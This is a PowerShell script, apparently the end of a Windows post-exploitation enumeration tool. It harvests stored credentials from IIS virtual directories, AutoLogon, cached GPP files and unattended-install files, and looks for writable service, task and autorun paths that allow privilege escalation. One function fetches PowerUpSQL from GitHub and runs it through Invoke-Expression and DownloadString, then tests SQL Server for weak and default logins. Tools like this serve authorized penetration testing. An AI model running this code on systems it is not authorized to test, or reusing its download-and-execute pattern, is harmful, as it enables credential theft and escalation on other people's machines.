            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
function Invoke-DefenderEnum {
    $Defender = Get-WmiObject -Class Win32_Service  -Filter "Name='WinDefend'"
    if($Defender){
        if(Get-Module -Name defender -ListAvailable){
            try{
                import-module -name Defender -Force -ErrorAction Stop
            }catch{
                Write-Output "[-] Could import Windows Defender module"
                return
            }
            Get-MpComputerStatus
            Get-MpPreference
            $table = @{
                MalwareDetected = (Get-MpThreatDetection).count
                MalwareRemoved = (Get-MpThreatDetection).ActionSuccess.count
                Top5MalwareProcess = (((Get-MpThreatDetection).ProcessName | Group-Object -NoElement  | Sort-Object -Property count -Descending | Select-Object -First 5).name -join ', ')
                Top5MalwareUser = (((Get-MpThreatDetection).DomainUser | Group-Object -NoElement  | Sort-Object -Property count -Descending | Select-Object -First 5).name -join ', ')
            }
            New-Object -TypeName PSobject -Property $table | Select-Object MalwareDetected,MalwareRemoved,Top5MalwareProcess,Top5MalwareUser
        }else{
            Write-Output "[-] Could not find Windows Defender module"
        }
    }
}
function Invoke-HostEnum {
    <#
    Checking Installed Software
    if mssql is installed download PowerUpSQL.ps1 and audit the databases
    if IIS is installed audit WebConfig and Application host pool
    if Server or DC, Enumerate Windows Defender
    #>
    param(
        [string]
        $PowerUpSQL='https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1'
    )
    Write-Output "[*] Installed Software"
    (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | where {$_.DisplayName} | Select-Object DisplayName, Publisher, InstallDate)
    $mssql = Get-WmiObject -Class Win32_Service  -Filter "Name='MSSQLSERVER'"
    if($mssql){
        Write-Output "[*] Starting MSSQL Audit"
        try{
            Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PowerUpSQL)
            $check = $true
        }catch{
            Write-Output "[-] Invoke-Expression (New-Object net.webclient).DownloadString Failed"
        }
        if(-not($check)){
            try{
                Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri $PowerUpSQL -ErrorAction Stop).content 
                $check = $true
            }catch{
                Write-Output "[-] Invoke-WebRequest Failed"
            }
        }
        if($check){
            $instances = Get-SQLInstanceLocal | Select-Object instance | Sort-Object -Unique 
            foreach($Instance in $instances){
                $instanceinfo = $instance | Get-SQLServerInfo
                if($instanceinfo){
                        Write-Output "`n[*] MSSQL Info"
                        $instanceinfo | Format-List
                        Write-Output "[*] MSSQL Links"
                        $instanceinfo | Get-SQLServerLinkCrawl  | Format-List
                        Write-Output "[*] MSSQL Users"
                        $instanceinfo | Get-SQLServerRoleMember | Format-List
                        #test if SQL Server is configured with default passwords.
                        $instanceinfo | Invoke-SQLAuditDefaultLoginPw | Format-List
                        # enumerateSQL Server logins and the current login and test for "username" as password for each enumerated login.
                        $instanceinfo | Invoke-SQLAuditWeakLoginPw | Format-List
                        #Check if any SQL Server links are configured with remote credentials.
                        $instanceinfo | Invoke-SQLAuditPrivServerLink  | Format-List
                        #Check if any databases have been configured as trustworthy
                        $instanceinfo | Invoke-SQLAuditPrivTrustworthy | Format-List
                        #Check if data ownership chaining is enabled at the server or databases levels.
                        $instanceinfo | Invoke-SQLAuditPrivDbChaining | Format-List
                        #This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
                        $instanceinfo | Invoke-SQLAuditSQLiSpExecuteAs | Format-List
                        #This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
                        $instanceinfo | Invoke-SQLAuditSQLiSpSigned | Format-List
                        #heck if any databases have been configured as trustworthy.
                        $instanceinfo | Invoke-SQLAuditPrivAutoExecSp | Format-List
                        #Non default database status
                        $instanceinfo | Get-SQLDatabase -NoDefaults | Format-List
                        #acl for database path
                        $instanceinfo | Get-SQLDatabase | Sort-Object -Unique -Property FileName | foreach {Get-ModifiablePath -Path $_.FileName -ErrorAction Continue | Format-List}
                        #search database for keywords in non default databases
                        #$instanceinfo | Get-SQLColumnSampleDataThreaded -Threads 20 -Keyword "credit,ssn,password" -SampleSize 2 -ValidateCC -NoDefaults | Format-List
                }else{
                    Write-Output "[-] Cant Enumerate Instance $($Instance.Instance)"
                }
            }
        }
    }
    if(Test-Path "HKLM:\SOFTWARE\Microsoft\InetStp\"){
        Write-Output "[*] Starting IIS testing"
        #https://powersploit.readthedocs.io/en/latest/Privesc/Get-WebConfig/
        Write-Output "[*] Checking WebConfig"
        try{
            $WebConfig = Get-WebConfig -ErrorAction Stop
            if($WebConfig){
                Write-Output "[-] WebConfig Credentials Found"
                $WebConfig
            }else{
                Write-Output "[+] No WebConfig Credentials Found"
            }
        }catch{
            Write-Output "[-] WebConfig Failed"
        }
        #https://powersploit.readthedocs.io/en/latest/Privesc/Get-ApplicationHost/
        Write-Output "[*] Checking Application Pool"
        try{
            $ApplicationHost = Get-ApplicationHost -ErrorAction Stop
            if($ApplicationHost){
                Write-Output "[-] ApplicationHost Credentials Found"
                $ApplicationHost
            }else{
                Write-Output "[+] No ApplicationHost Credentials Found"
            }
        }catch{
            Write-Output "[-] ApplicationHost Failed"
        }
    }
    Write-Output "[*] Print Spooler Status"
    (Get-WmiObject -Class Win32_Service  -Filter "Name='Spooler'" | Format-Table Name,DisplayName,Status,State,StartMode)
    Write-Output "[*] Checking WinHttpAutoProxySvc Status"
    (Get-WmiObject -Class Win32_Service  -Filter "Name='WinHttpAutoProxySvc'" | Format-Table Name,DisplayName,Status,State,StartMode)
    $OSinfo = (Get-CimInstance -ClassName Win32_OperatingSystem).ProductType
    if($OSinfo -eq 1){
        Write-Output "[*] Starting Workstation testing"
        Write-Output "[*] PowerShell Version 2: $((Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2).state)"
    }else{
        Write-Output "[*] Starting Server testing"
        Write-Output "[*] Starting Windows Defender Audit"
        Invoke-DefenderEnum
        Write-Output "[*] PowerShell Version 2: $((Get-WindowsFeature PowerShell-V2 -ErrorAction SilentlyContinue).InstallState)"
    }
}
function Invoke-WinEnum {
    #Start timer
    $timer = [Diagnostics.Stopwatch]::StartNew()

    #Get Local admins for acl checking
    $LocalAdmins = Get-LocalAdministrators
    $Admins = @(
        'System',
        'TrustedInstaller',
        'CREATOR OWNER',
        'Administrators'
        $LocalAdmins.name
    )

    #
    Write-Output "`n[*] Checking System Information"
    try{
        Get-SysInfo
    }catch{
        Write-Output "[-] SysInfo Failed"
    }

    #
    Write-Output "[*] Checking Local Security Products"
    try{
        Get-LocalSecurityProducts
    }catch{
        Write-Output "[-] Local Security Products Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-RegistryAutoLogon/
    Write-Output "`n[*] Checking AutoLogon"
    try{
        $autologon = Get-RegistryAutoLogon -ErrorAction Stop
        if($autologon){
            Write-Output "[-] AutoLogon Credentials Found"
            $autologon
        }else{
            Write-Output "[+] No AutoLogon Credentials Found"
        }
    }catch{
        Write-Output "[-] AutoLogon Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-CachedGPPPassword/
    Write-Output "`n[*] Checking CachedGPPPassword"
    try{
        $CachedGPPPassword = Get-CachedGPPPassword -ErrorAction Stop
        if($CachedGPPPassword){
            Write-Output "[-] CachedGPPPassword Found"
            $CachedGPPPassword
        }else{
            Write-Output "[+] No CachedGPPPassword Found"
        }
    }catch{
        Write-Output "[-] CachedGPPPassword Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnattendedInstallFile/
    Write-Output "`n[*] Checking UnattendedInstallFiles"
    try{
        $UnattendedInstallFile = Get-UnattendedInstallFile -ErrorAction Stop
        if($UnattendedInstallFile){
            Write-Output "[-] UnattendedInstallFiles Found"
            $UnattendedInstallFile
        }else{
            Write-Output "[+] No UnattendedInstallFiles Found"
        }
    }catch{
        Write-Output "[-] UnattendedInstallFiles Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-UnquotedService/
    Write-Output "`n[*] Checking Unquoted Services"
    try{
        $UnquotedService = Get-UnquotedService -ErrorAction Stop
        if($UnquotedService){
            Write-Output "[-] Unquoted Services Found"
            $UnquotedService
        }else{
            Write-Output "[+] No Unquoted Services Found"
        }
    }catch{
        Write-Output "[-] Unquoted Services Failed"
    }

    #https://powersploit.readthedocs.io/en/latest/Privesc/Get-RegistryAlwaysInstallElevated/
    Write-Output "`n[*] Checking AlwaysInstallElevated"
    try{
        $UnquotedService = Get-RegistryAlwaysInstallElevated -ErrorAction Stop
        if($UnquotedService){
            Write-Output "[-] AlwaysInstallElevated Found"
            $UnquotedService
        }else{
            Write-Output "[+] No AlwaysInstallElevated Found"
        }
    }catch{
        Write-Output "[-] AlwaysInstallElevated Failed"
    }

    #
    Write-Output "`n[*] Checking UAC Configuration"
    try{
        Get-UACLevel
    }catch{
        Write-Output "[-] Checking for UAC Configuration Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Local Shares"
    try{
        Get-LocalShares
    }catch{
        Write-Output "[-] Checking for ACL's on Local Shares Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Possible High Privileged Scheduled Tasks Binaries and Folders"
    try{
        Get-WriteableScheduledTasks -SkipUser $Admins
    }catch{
        Write-Output "[-] Checking Possible High Integrity Scheduled Tasks Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Folders in Admins PATH"
    try{
        Get-WritableAdminPath -SkipUser $Admins
    }catch{
        Write-Output "[-] Checking Admins PATH Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on Services Binaries and Folders"
    try{
        Get-WritableServices -SkipUser $Admins
    }catch{
        "[-] Checking Services Failed"
    }

    #
    Write-Output "`n[*] Checking ACL's on AutoRuns Binaries and Folders"
    try{
        Get-WriteableAutoRuns -SkipUser $Admins
    }catch{
        "[-] Checking AutoRuns Failed"
    }
    
    #
    Write-Output "`n[*] Checking Active Listenings Ports"
    try{
        Get-ActiveListeners | Format-Table
    }catch{
        "[-] Checking Active Listenings Failed"
    }
    
    Write-Output "`n[*] Enumerating host.."
    Invoke-HostEnum 
    
    Write-Output "Scan took $($timer.Elapsed.TotalSeconds) Seconds"
    $timer.Stop()
}

#Invoke-WinEnum